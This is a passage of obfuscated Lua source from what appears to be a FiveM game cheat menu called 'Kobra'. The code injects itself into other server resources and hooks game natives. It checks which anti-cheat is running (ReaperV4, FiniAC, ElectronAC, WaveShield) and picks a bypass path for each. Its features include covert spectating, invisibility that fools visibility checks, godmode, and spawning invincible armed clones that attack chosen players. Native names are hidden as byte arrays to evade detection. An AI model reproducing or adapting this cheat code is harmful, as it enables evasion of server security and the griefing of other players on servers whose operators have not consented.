            end
            local function _b(str)
                local t = {}
                for i = 1, #str do t[i] = string.byte(str, i) end
                return t
            end
            local function _d(tbl)
                local s = ""
                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                return s
            end
            local function _g(n)
                local k = _d(n)
                local f = _G[k]
                if not f then print("[ReaperV4 Spectate] Error: Global function " .. k .. " not found") end
                return f
            end
            local function _w(n)
                return Citizen.Wait(n)
            end
            local function _t()
                local createThread = _G[_d(_b("CreateThread"))]
                if not createThread then print("[ReaperV4 Spectate] Error: CreateThread not found") end
                return createThread
            end
            HookNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
            HookNative("GetActivePlayers", function(originalFn, ...) return originalFn(...) end)
            HookNative("GetPlayerServerId", function(originalFn, ...) return originalFn(...) end)
            HookNative("GetPlayerPed", function(originalFn, ...) return originalFn(...) end)
            HookNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            HookNative("RequestCollisionAtCoord", function(originalFn, ...) return originalFn(...) end)
            HookNative("NetworkSetInSpectatorMode", function(originalFn, ...) return originalFn(...) end)
            HookNative("FreezeEntityPosition", function(originalFn, ...) return originalFn(...) end)
            HookNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            HookNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)
            HookNative("SetEntityCollision", function(originalFn, ...) return originalFn(...) end)
            HookNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
            HookNative("NetworkSetEntityInvisibleToNetwork", function(originalFn, ...) return originalFn(...) end)
            HookNative("SetEntityInvincible", function(originalFn, ...) return originalFn(...) end)
            HookNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
            HookNative("IsEntityVisible", function(originalFn, ...) return originalFn(...) end)
            HookNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
            local function findClientIdByServerId(sid)
                local players = _g(_b("GetActivePlayers"))()
                if not players then
                    print("[ReaperV4 Spectate] Error: GetActivePlayers returned nil")
                    return -1
                end
                print("[ReaperV4 Spectate] Active players:", table.concat(players, ", "))
                for _, pid in ipairs(players) do
                    local serverId = _g(_b("GetPlayerServerId"))(pid)
                    print("[ReaperV4 Spectate] Player Client ID:", pid, "Server ID:", serverId)
                    if serverId == sid then
                        print("[ReaperV4 Spectate] Found client ID:", pid, "for server ID:", sid)
                        return pid
                    end
                end
                print("[ReaperV4 Spectate] Error: No client ID found for server ID:", sid)
                return -1
            end
            local function stopSpectate()
                if not _G.osintSpectate or not _G.osintSpectate.enabled then
                    print("[ReaperV4 Spectate] StopSpectate: Not currently spectating")
                    return
                end
                local me = _g(_b("PlayerPedId"))()
                if not me then
                    print("[ReaperV4 Spectate] Error: PlayerPedId returned nil")
                    return
                end
                local back = _G.osintSpectate.back
                local heading = _G.osintSpectate.heading
                local wasVisible = _G.osintSpectate.wasVisible
                if back then
                    _g(_b("RequestCollisionAtCoord"))(back.x, back.y, back.z)
                end
                local success, err = pcall(function()
                    _g(_b("NetworkSetInSpectatorMode"))(false, me)
                end)
                if not success then
                    print("[ReaperV4 Spectate] Error: NetworkSetInSpectatorMode failed:", err)
                end
                _g(_b("FreezeEntityPosition"))(me, false)
                if back then
                    _g(_b("SetEntityCoords"))(me, back.x, back.y, back.z, false, false, false, true)
                end
                if heading then
                    _g(_b("SetEntityHeading"))(me, heading)
                end
                _g(_b("SetEntityCollision"))(me, true, true)
                _g(_b("SetEntityVisible"))(me, wasVisible == nil and true or wasVisible)
                _g(_b("SetEntityInvincible"))(me, false)
                _G.osintSpectate.enabled = false
                _G.osintSpectate.targetSid = nil
                print("[ReaperV4 Spectate] Stopped spectating")
            end
            local function startSpectate(targetSid)
                local me = _g(_b("PlayerPedId"))()
                if not me then
                    print("[ReaperV4 Spectate] Error: PlayerPedId returned nil")
                    return
                end
                local myCoords = _g(_b("GetEntityCoords"))(me)
                if not myCoords then
                    print("[ReaperV4 Spectate] Error: GetEntityCoords returned nil")
                    return
                end
                local myHeading = _g(_b("GetEntityHeading"))(me)
                if not _G.osintSpectate then _G.osintSpectate = {} end
                _G.osintSpectate.back = vec3(myCoords.x, myCoords.y, myCoords.z - 1.0)
                _G.osintSpectate.heading = myHeading
                _G.osintSpectate.wasVisible = _g(_b("IsEntityVisible"))(me)
                _G.osintSpectate.enabled = true
                _G.osintSpectate.targetSid = targetSid
                local clientId = findClientIdByServerId(targetSid)
                local targetPed = (clientId ~= -1) and _g(_b("GetPlayerPed"))(clientId) or 0
                if clientId == -1 or targetPed == 0 then
                    print("[ReaperV4 Spectate] Error: Invalid client ID or target ped not found for server ID:", targetSid)
                    _G.osintSpectate.enabled = false
                    TriggerEvent('Kobra:Notify', "error", "Kobra", "Target player not found!", 3000)
                    return
                end
                local tCoords = _g(_b("GetEntityCoords"))(targetPed)
                if not tCoords then
                    print("[ReaperV4 Spectate] Error: GetEntityCoords for target ped returned nil")
                    _G.osintSpectate.enabled = false
                    TriggerEvent('Kobra:Notify', "error", "Kobra", "Failed to get target position!", 3000)
                    return
                end
                _g(_b("RequestCollisionAtCoord"))(tCoords.x, tCoords.y, tCoords.z)
                _g(_b("SetEntityVisible"))(me, false, false)
                _g(_b("SetEntityCollision"))(me, false, false)
                _g(_b("NetworkSetEntityInvisibleToNetwork"))(me, true)
                _g(_b("SetEntityInvincible"))(me, true)
                local zOffset = 15.0 -- Default offset since GetGroundZFor_3dCoord is unavailable
                _g(_b("SetEntityCoords"))(me, tCoords.x, tCoords.y, tCoords.z + zOffset, false, false, false, true)
                _w(300)
                _g(_b("FreezeEntityPosition"))(me, true)
                local success, err = pcall(function()
                    _g(_b("NetworkSetInSpectatorMode"))(true, targetPed)
                end)
                if not success then
                    print("[ReaperV4 Spectate] Error: NetworkSetInSpectatorMode failed:", err)
                    _G.osintSpectate.enabled = false
                    TriggerEvent('Kobra:Notify', "error", "Kobra", "Spectator mode not supported!", 3000)
                    return
                end
                print("[ReaperV4 Spectate] Started spectating server ID:", targetSid, "on ped:", targetPed)
                _t()(function()
                    while _G.osintSpectate and _G.osintSpectate.enabled do
                        local cid = findClientIdByServerId(_G.osintSpectate.targetSid or targetSid)
                        if cid == -1 then
                            print("[ReaperV4 Spectate] Error: Client ID not found in loop for server ID:", targetSid)
                            break
                        end
                        local ped = _g(_b("GetPlayerPed"))(cid)
                        if not ped or ped == 0 or not _g(_b("DoesEntityExist"))(ped) then
                            print("[ReaperV4 Spectate] Error: Target ped not found or does not exist")
                            break
                        end
                        local pc = _g(_b("GetEntityCoords"))(ped)
                        if not pc then
                            print("[ReaperV4 Spectate] Error: GetEntityCoords returned nil in loop")
                            break
                        end
                        _g(_b("SetEntityCoords"))(me, pc.x, pc.y, pc.z + zOffset, false, false, false, true)
                        _w(400)
                    end
                    stopSpectate()
                end)
            end
            local enable = %s
            local sid = %d
            if enable then
                print("[ReaperV4 Spectate] Starting spectate for server ID:", sid)
                startSpectate(sid)
            else
                print("[ReaperV4 Spectate] Stopping spectate")
                stopSpectate()
            end
        ]],tostring(v210),v212);local v770,v771=load(v769);if v770 then local v871=0 -0 ;local v872;local v873;while true do if (v871==(0 + 0)) then v872,v873=pcall(v770);if  not v872 then print("[ReaperV4 Spectate] Execution error:",v873);v208:Notify("error","Kobra","Failed to execute spectate code!",3689 -(586 + 103) );else print("[ReaperV4 Spectate] Code executed successfully");end break;end end else local v874=0;while true do if (v874==(0 + 0)) then print("[ReaperV4 Spectate] Load error:",v771);v208:Notify("error","Kobra","Failed to load spectate code!",3000);break;end end end elseif ((GetResourceState("FiniAC")=="started") or (GetResourceState("ElectronAC")=="started")) then local v875=0 -0 ;while true do if (v875==(1488 -(1309 + 179))) then print("Spectate Fallback #1");MachoInjectResourceRaw("any",string.format([[
                local function HookNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end
                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end
                local function _b(str)
                    local t = {}
                    for i = 1, #str do t[i] = string.byte(str, i) end
                    return t
                end
                local function _d(tbl)
                    local s = ""
                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                    return s
                end
                local function _g(n)
                    local k = _d(n)
                    local f = _G[k]
                    return f
                end
                local function _w(n)
                    return Citizen.Wait(n)
                end
                local function _t()
                    return _G[_d(_b("CreateThread"))]
                end
                HookNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetActivePlayers", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetPlayerServerId", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetPlayerPed", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                HookNative("RequestCollisionAtCoord", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityCollision", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityInvincible", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetGroundZFor_3dCoord", function(originalFn, ...) return originalFn(...) end)
                HookNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                HookNative("CreateCam", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetCamCoord", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetCamRot", function(originalFn, ...) return originalFn(...) end)
                HookNative("RenderScriptCams", function(originalFn, ...) return originalFn(...) end)
                HookNative("DestroyCam", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetFocusEntity", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetDisabledControlNormal", function(originalFn, ...) return originalFn(...) end)
                HookNative("FreezeEntityPosition", function(originalFn, ...) return originalFn(...) end)
                HookNative("IsEntityVisible", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetFocusPosAndVel", function(originalFn, ...) return originalFn(...) end)
                local function Clamp(val, min, max)
                    if val < min then return min end
                    if val > max then return max end
                    return val
                end
                local function findClientIdByServerId(sid)
                    local players = _g(_b("GetActivePlayers"))()
                    for _, pid in ipairs(players) do
                        if _g(_b("GetPlayerServerId"))(pid) == sid then
                            return pid
                        end
                    end
                    return -1
                end
                local function stopSpectate()
                    if not _G.osintSpectate or not _G.osintSpectate.enabled then return end
                    local me = _g(_b("PlayerPedId"))()
                    local back = _G.osintSpectate.back
                    local heading = _G.osintSpectate.heading
                    local wasVisible = _G.osintSpectate.wasVisible
                    if _G.osintSpectate.camera then
                        _g(_b("RenderScriptCams"))(false, false, 0, true, true)
                        _g(_b("DestroyCam"))(_G.osintSpectate.camera, false)
                        _G.osintSpectate.camera = nil
                    end
                    if back then _g(_b("RequestCollisionAtCoord"))(back) end
                    _g(_b("FreezeEntityPosition"))(me, false)
                    if back then
                        local valid, groundZ = _g(_b("GetGroundZFor_3dCoord"))(back.x, back.y, back.z, false)
                        local targetCoords = valid and vector3(back.x, back.y, groundZ + 1.0) or back
                        _g(_b("SetEntityCoords"))(me, targetCoords.x, targetCoords.y, targetCoords.z, false, false, false, true)
                    end
                    if heading then _g(_b("SetEntityHeading"))(me, heading) end
                    _g(_b("SetEntityCollision"))(me, true, true)
                    _g(_b("SetEntityVisible"))(me, wasVisible == nil and true or wasVisible)
                    _G.osintSpectate.enabled = false
                    _G.osintSpectate.targetSid = nil
                    _g(_b("SetFocusEntity"))(me)
                end
                local function startSpectate(targetSid)
                    local me = _g(_b("PlayerPedId"))()
                    local myCoords = _g(_b("GetEntityCoords"))(me)
                    local myHeading = _g(_b("GetEntityHeading"))(me)
                    if not _G.osintSpectate then _G.osintSpectate = {} end
                    _G.osintSpectate.back = vec3(myCoords.x, myCoords.y, myCoords.z)
                    _G.osintSpectate.heading = myHeading
                    _G.osintSpectate.wasVisible = _g(_b("IsEntityVisible"))(me)
                    _G.osintSpectate.enabled = true
                    _G.osintSpectate.targetSid = targetSid
                    local clientId = findClientIdByServerId(targetSid)
                    local targetPed = (clientId ~= -1) and _g(_b("GetPlayerPed"))(clientId) or 0
                    if clientId == -1 or targetPed == 0 then
                        _G.osintSpectate.enabled = false
                        return
                    end
                    local tCoords = _g(_b("GetEntityCoords"))(targetPed)
                    _g(_b("RequestCollisionAtCoord"))(tCoords)
                    _g(_b("SetEntityVisible"))(me, false, false)
                    _g(_b("SetEntityCollision"))(me, false, false)
                    _g(_b("SetEntityInvincible"))(me, true)
                    local zOffset = 3.0
                    local cam = _g(_b("CreateCam"))("DEFAULT_SCRIPTED_CAMERA", true)
                    _G.osintSpectate.camera = cam
                    _g(_b("SetCamCoord"))(cam, tCoords.x, tCoords.y, tCoords.z + zOffset)
                    _g(_b("SetCamRot"))(cam, -30.0, 0.0, _g(_b("GetEntityHeading"))(targetPed), 2)
                    _g(_b("RenderScriptCams"))(true, false, 0, true, true)
                    _t()(function()
                        local cameraReady = false
                        _w(550)
                        cameraReady = true
                        while _G.osintSpectate and _G.osintSpectate.enabled and cameraReady do
                            local cid = findClientIdByServerId(_G.osintSpectate.targetSid or targetSid)
                            if cid == -1 then break end
                            local ped = _g(_b("GetPlayerPed"))(cid)
                            if not ped or ped == 0 or not _g(_b("DoesEntityExist"))(ped) then break end
                            local pc = _g(_b("GetEntityCoords"))(ped)
                            _g(_b("SetCamCoord"))(cam, pc.x, pc.y, pc.z + zOffset)
                            local camRot = _g(_b("GetCamRot"))(cam, 2)
                            local x = _g(_b("GetDisabledControlNormal"))(0, 1)
                            local y = _g(_b("GetDisabledControlNormal"))(0, 2)
                            local newPitch = Clamp(camRot.x - y * 5, -89.0, 89.0)
                            local newYaw = camRot.z - x * 5
                            _g(_b("SetCamRot"))(cam, newPitch, camRot.y, newYaw, 2)
                            _g(_b("SetFocusPosAndVel"))(pc.x, pc.y, pc.z, 0.0, 0.0, 0.0)
                            _w(0)
                        end
                        stopSpectate()
                    end)
                end
                local enable = %s
                local sid = %d
                if enable then
                    startSpectate(sid)
                else
                    stopSpectate()
                end
            ]],tostring(v210),v212));break;end end else local v876=0 -0 ;while true do if ((0 + 0)==v876) then print("Spectate Fallback #2");MachoInjectResourceRaw("monitor",string.format([[
                local function HookNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end
                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end
                local function _b(str)
                    local t = {}
                    for i = 1, #str do t[i] = string.byte(str, i) end
                    return t
                end
                local function _d(tbl)
                    local s = ""
                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                    return s
                end
                local function _g(n)
                    local k = _d(n)
                    local f = _G[k]
                    return f
                end
                local function _w(n)
                    return Citizen.Wait(n)
                end
                local function _t()
                    return _G[_d(_b("CreateThread"))]
                end
                HookNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetActivePlayers", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetPlayerServerId", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetPlayerPed", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                HookNative("RequestCollisionAtCoord", function(originalFn, ...) return originalFn(...) end)
                HookNative("NetworkSetInSpectatorMode", function(originalFn, ...) return originalFn(...) end)
                HookNative("FreezeEntityPosition", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityCollision", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                HookNative("NetworkSetEntityInvisibleToNetwork", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityInvincible", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetGroundZFor_3dCoord", function(originalFn, ...) return originalFn(...) end)
                HookNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                HookNative("IsEntityVisible", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                local function findClientIdByServerId(sid)
                    local players = _g(_b("GetActivePlayers"))()
                    for _, pid in ipairs(players) do
                        if _g(_b("GetPlayerServerId"))(pid) == sid then
                            return pid
                        end
                    end
                    return -1
                end
                local function stopSpectate()
                    if not _G.osintSpectate or not _G.osintSpectate.enabled then return end
                    local me = _g(_b("PlayerPedId"))()
                    local back = _G.osintSpectate.back
                    local heading = _G.osintSpectate.heading
                    local wasVisible = _G.osintSpectate.wasVisible
                    if back then _g(_b("RequestCollisionAtCoord"))(back) end
                    _g(_b("NetworkSetInSpectatorMode"))(false, me)
                    _g(_b("FreezeEntityPosition"))(me, false)
                    if back then _g(_b("SetEntityCoords"))(me, back.x, back.y, back.z, false, false, false, true) end
                    if heading then _g(_b("SetEntityHeading"))(me, heading) end
                    _g(_b("SetEntityCollision"))(me, true, true)
                    _g(_b("SetEntityVisible"))(me, wasVisible == nil and true or wasVisible)
                    _G.osintSpectate.enabled = false
                    _G.osintSpectate.targetSid = nil
                end
                local function startSpectate(targetSid)
                    local me = _g(_b("PlayerPedId"))()
                    local myCoords = _g(_b("GetEntityCoords"))(me)
                    local myHeading = _g(_b("GetEntityHeading"))(me)
                    if not _G.osintSpectate then _G.osintSpectate = {} end
                    _G.osintSpectate.back = vec3(myCoords.x, myCoords.y, myCoords.z - 1.0)
                    _G.osintSpectate.heading = myHeading
                    _G.osintSpectate.wasVisible = _g(_b("IsEntityVisible"))(me)
                    _G.osintSpectate.enabled = true
                    _G.osintSpectate.targetSid = targetSid
                    local clientId = findClientIdByServerId(targetSid)
                    local targetPed = (clientId ~= -1) and _g(_b("GetPlayerPed"))(clientId) or 0
                    if clientId == -1 or targetPed == 0 then
                        _G.osintSpectate.enabled = false
                        return
                    end
                    local tCoords = _g(_b("GetEntityCoords"))(targetPed)
                    _g(_b("RequestCollisionAtCoord"))(tCoords)
                    _g(_b("SetEntityVisible"))(me, false, false)
                    _g(_b("SetEntityCollision"))(me, false, false)
                    _g(_b("NetworkSetEntityInvisibleToNetwork"))(me, true)
                    _g(_b("SetEntityInvincible"))(me, true)
                    local groundZ = tCoords.z
                    local foundGround, zPos = _g(_b("GetGroundZFor_3dCoord"))(tCoords.x, tCoords.y, tCoords.z, false)
                    if foundGround then
                        groundZ = zPos
                    end
                    local zOffset = math.max(15.0, tCoords.z - groundZ + 5.0)
                    _g(_b("SetEntityCoords"))(me, tCoords.x, tCoords.y, tCoords.z - zOffset, false, false, false, true)
                    _w(300)
                    _g(_b("FreezeEntityPosition"))(me, true)
                    _g(_b("NetworkSetInSpectatorMode"))(true, targetPed)
                    _t()(function()
                        while _G.osintSpectate and _G.osintSpectate.enabled do
                            local cid = findClientIdByServerId(_G.osintSpectate.targetSid or targetSid)
                            if cid == -1 then break end
                            local ped = _g(_b("GetPlayerPed"))(cid)
                            if not ped or ped == 0 or not _g(_b("DoesEntityExist"))(ped) then break end
                            local pc = _g(_b("GetEntityCoords"))(ped)
                            local groundZ = pc.z
                            local foundGround, zPos = _g(_b("GetGroundZFor_3dCoord"))(pc.x, pc.y, pc.z, false)
                            if foundGround then
                                groundZ = zPos
                            end
                            local zOffset = math.max(15.0, pc.z - groundZ + 5.0)
                            _g(_b("SetEntityCoords"))(me, pc.x, pc.y, pc.z - zOffset, false, false, false, true)
                            _w(400)
                        end
                        stopSpectate()
                    end)
                end
                local enable = %s
                local sid = %d
                if enable then
                    startSpectate(sid)
                else
                    stopSpectate()
                end
            ]],tostring(v210),v212));break;end end end break;end if (v211==(0 -0)) then if  not v209 then local v772=0 + 0 ;while true do if ((0 -0)==v772) then v208:Notify("error","Kobra","Invalid player ID provided!",5977 -2977 );return;end end end v212=tonumber(v209);v211=610 -(295 + 314) ;end if (v211==(4 -2)) then if v210 then v208:Notify("success","Kobra",("You have started spectating the player %s - [%s]!"):format(GetPlayerName(GetPlayerFromServerId(v212)) or "Unknown" ,v212),4962 -(1300 + 662) );else v208:Notify("error","Kobra",("You have stopped spectating the player %s - [%s]!"):format(GetPlayerName(GetPlayerFromServerId(v212)) or "Unknown" ,v212),3000);end v213=GetResourceState("ReaperV4")=="started" ;v211=9 -6 ;end end end;local v74={"envi-medic","envi-hud","envi-yoga","envi-chopshop","envi-chopshop-v2","envi-foodtrucks","envi-dumpsters","envi-prescriptions","envi-druglabs","lation_laundering"};local function v75() local v214=302 -(115 + 187) ;while true do if (0==v214) then for v711,v712 in ipairs(v74) do if (GetResourceState(v712)=="started") then return v712;end end return nil;end end end local v76=nil;if ((GetResourceState("es_extended")=="started") and (GetResourceState("timeless-emotes")=="started")) then v76="es_extended";elseif ((GetResourceState("core")=="started") and (GetResourceState("timeless-emotes")=="started")) then v76="core";end v12.EnableInvisibility=function(v215) local function v216(v328,v329) local v330=_G[v328];if ( not v330 or (type(v330)~="function")) then return;end _G[v328]=function(...) return v329(v330,...);end;end v216("CreateThread",function(v331,...) return v331(...);end);v216("PlayerPedId",function(v332,...) return v332(...);end);v216("IsEntityVisible",function(v333,...) return true;end);v216("IsEntityVisibleToScript",function(v334,...) return true;end);v216("SetEntityVisible",function(v335,v336,v337,v338) local v339=0 + 0 ;while true do if (v339==0) then if (_G.osintInvisibility and _G.osintInvisibility.enabled) then return v335(v336,false,v338);end return v335(v336,v337,v338);end end end);if  not _G.osintInvisibility then _G.osintInvisibility={enabled=false,wasVisible=true};end if  not _G.osintInvisibility.enabled then _G.osintInvisibility.enabled=true;local v549=PlayerPedId();_G.osintInvisibility.wasVisible=IsEntityVisible(v549);SetEntityVisible(v549,false,false);CreateThread(function() while _G.osintInvisibility and _G.osintInvisibility.enabled  do local v713=0;local v714;while true do if ((0 + 0)==v713) then v714=PlayerPedId();if (v714 and DoesEntityExist(v714)) then SetEntityVisible(v714,false,false);end v713=3 -2 ;end if (v713==(1162 -(160 + 1001))) then Wait(500);break;end end end end);end end;v12.DisableInvisibility=function(v217) if (_G.osintInvisibility and _G.osintInvisibility.enabled) then local v550=0;local v551;while true do if (v550==(1 + 0)) then if (v551 and DoesEntityExist(v551)) then SetEntityVisible(v551,_G.osintInvisibility.wasVisible,false);end break;end if (v550==(0 + 0)) then _G.osintInvisibility.enabled=false;v551=PlayerPedId();v550=1 -0 ;end end end end;v12.HandleAttackClonePlayer=function(v218,v219) if ( not v219 or ( #v219==0)) then return;end local v220=table.concat(v219,",");MachoHookNative(2596915000000000000 -(237 + 121) ,function(v340) return true,v340;end);MachoHookNative(15321135000000000000,function(v341,v342,v343,v344,v345,v346,v347) return true,v341,v342,v343,v344,v345,v346,v347;end);MachoInjectResourceRaw("monitor",string.format([[
        local function decode(tbl)
            local s = ""
            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
            return s
        end
        local function g(n)
            return _G[decode(n)]
        end
        local function wait(n)
            return Citizen.Wait(n)
        end
        local function findClientIdByServerId(sid)
            local players = g({71,101,116,65,99,116,105,118,101,80,108,97,121,101,114,115})()
            for _, pid in ipairs(players) do
                if g({71,101,116,80,108,97,121,101,114,83,101,114,118,101,114,73,100})(pid) == sid then
                    return pid
                end
            end
            return nil
        end
        local function copyPedAppearance(sourcePed, targetPed)
            for i = 0, 11 do
                local drawable = g({71,101,116,80,101,100,68,114,97,119,97,98,108,101,86,97,114,105,97,116,105,111,110})(sourcePed, i)
                local texture = g({71,101,116,80,101,100,84,101,120,116,117,114,101,86,97,114,105,97,116,105,111,110})(sourcePed, i)
                g({83,101,116,80,101,100,67,111,109,112,111,110,101,110,116,86,97,114,105,97,116,105,111,110})(targetPed, i, drawable, texture, 2)
            end
            for i = 0, 7 do
                local propIndex = g({71,101,116,80,101,100,80,114,111,112,73,110,100,101,120})(sourcePed, i)
                local propTexture = g({71,101,116,80,101,100,80,114,111,112,84,101,120,116,117,114,101,73,110,100,101,120})(sourcePed, i)
                if propIndex ~= -1 then
                    g({83,101,116,80,101,100,80,114,111,112})(targetPed, i, propIndex, propTexture)
                else
                    g({67,108,101,97,114,80,101,100,80,114,111,112})(targetPed, i)
                end
            end
            local headBlendData = {g({71,101,116,80,101,100,72,101,97,100,66,108,101,110,100,68,97,116,97})(sourcePed)}
            if headBlendData[1] then
                g({83,101,116,80,101,100,72,101,97,100,66,108,101,110,100,68,97,116,97})(
                    targetPed,
                    headBlendData[2], -- shapeFirst
                    headBlendData[3], -- shapeSecond
                    headBlendData[4], -- shapeThird
                    headBlendData[5], -- skinFirst
                    headBlendData[6], -- skinSecond
                    headBlendData[7], -- skinThird
                    headBlendData[8], -- shapeMix
                    headBlendData[9], -- skinMix
                    headBlendData[10] -- thirdMix
                )
            end
        end
        local function clonePed(ped)
            local coords = g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115})(ped)
            local heading = g({71,101,116,69,110,116,105,116,121,72,101,97,100,105,110,103})(ped)
            local modelHash = g({71,101,116,69,110,116,105,116,121,77,111,100,101,108})(ped)
            g({82,101,113,117,101,115,116,77,111,100,101,108})(modelHash)
            local timeout = 0
            while not g({72,97,115,77,111,100,101,108,76,111,97,100,101,100})(modelHash) and timeout < 500 do
                wait(10)
                timeout = timeout + 1
            end
            if not g({72,97,115,77,111,100,101,108,76,111,97,100,101,100})(modelHash) then return end
            -- Spawn ped 2 units away from player
            local spawnRadius = 2.0
            local spawnX = coords.x + (math.random() * 2 - 1) * spawnRadius
            local spawnY = coords.y + (math.random() * 2 - 1) * spawnRadius
            local spawnZ = coords.z
            local clone = g({67,114,101,97,116,101,80,101,100})(4, modelHash, spawnX, spawnY, spawnZ, heading, true, true)
            if clone and g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(clone) then
                copyPedAppearance(ped, clone)
                g({83,101,116,69,110,116,105,116,121,65,115,77,105,115,115,105,111,110,69,110,116,105,116,121})(clone, true, true)
                g({83,101,116,77,111,100,101,108,65,115,78,111,76,111,110,103,101,114,78,101,101,100,101,100})(modelHash)
                local cloneGroup = g({65,100,100,82,101,108,97,116,105,111,110,115,104,105,112,71,114,111,117,112})("HOSTILE_CLONE_" .. tostring(clone))
                g({83,101,116,80,101,100,82,101,108,97,116,105,111,110,115,104,105,112,71,114,111,117,112,72,97,115,104})(clone, cloneGroup)
                g({83,101,116,82,101,108,97,116,105,111,110,115,104,105,112,66,101,116,119,101,101,110,71,114,111,117,112,115})(5, cloneGroup, g({71,101,116,72,97,115,104,75,101,121})("PLAYER"))
                g({83,101,116,82,101,108,97,116,105,111,110,115,104,105,112,66,101,116,119,101,101,110,71,114,111,117,112,115})(5, g({71,101,116,72,97,115,104,75,101,121})("PLAYER"), cloneGroup)
                
                local weaponHash = g({71,101,116,72,97,115,104,75,101,121})(decode({87,69,65,80,79,78,95,83,84,85,78,71,85,78}))
                g({71,105,118,101,87,101,97,112,111,110,84,111,80,101,100})(clone, weaponHash, 1000, false, true)
                local weaponEntity = g({71,101,116,67,117,114,114,101,110,116,80,101,100,87,101,97,112,111,110,69,110,116,105,116,121,73,110,100,101,120})(clone)
                if weaponEntity and g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(weaponEntity) then
                    g({83,101,116,69,110,116,105,116,121,65,115,77,105,115,115,105,111,110,69,110,116,105,116,121})(weaponEntity, true, true)
                end
                g({83,101,116,80,101,100,68,114,111,112,115,87,101,97,112,111,110,115,87,104,101,110,68,101,97,100})(clone, false)
                g({83,101,116,80,101,100,67,97,110,83,119,105,116,99,104,87,101,97,112,111,110})(clone, false)
                g({84,97,115,107,67,111,109,98,97,116,80,101,100})(clone, ped, 0, 16)
                g({83,101,116,80,101,100,67,111,109,98,97,116,65,116,116,114,105,98,117,116,101,115})(clone, 0, true) -- Always aggressive
                g({83,101,116,80,101,100,70,108,101,101,65,116,116,114,105,98,117,116,101,115})(clone, 0, false) -- Prevent fleeing
                g({83,101,116,69,110,116,105,116,121,73,110,118,105,110,99,105,98,108,101})(clone, true)
                g({83,101,116,80,101,100,67,97,110,82,97,103,100,111,108,108})(clone, false)
            end
        end
        local playerIds = {%s}
        for _, targetServerId in ipairs(playerIds) do
            local clientId = findClientIdByServerId(targetServerId)
            local ped = clientId and g({71,101,116,80,108,97,121,101,114,80,101,100})(clientId) or nil
            if ped and g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(ped) then
                clonePed(ped)
            end
        end
    ]],v220));end;v12.HandleGodmodeToggle=function(v221,v222) local v223=897 -(525 + 372) ;local v224;local v225;while true do if (v223==(0 -0)) then v224=GetResourceState("WaveShield")=="started" ;v225=((GetResourceState("monitor")=="started") and "monitor") or (v224 and "WaveShield") or "any" ;v223=1;end if (v223==(3 -2)) then if v224 then if v222 then v12:Notify("success","Kobra","Godmode Enabled (WaveShield)",3000);v48(v225,[[
                if not _G.osintGodmode then _G.osintGodmode = { enabled = false, originals = {} } end
                _G.osintGodmode.enabled = true

                local function hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then return end
                    if not _G.osintGodmode.originals[nativeName] then
                        _G.osintGodmode.originals[nativeName] = originalNative
                    end
                    _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                end

                hNative("SetEntityInvincible", function(originalFn, entity, toggle)
                    if _G.osintGodmode and _G.osintGodmode.enabled then
                        return originalFn(entity, true)
                    end
                    return originalFn(entity, toggle)
                end)

                local co = coroutine.create(function()
                    local ped = PlayerPedId()
                    if DoesEntityExist(ped) then SetEntityInvincible(ped, true) end
                end)
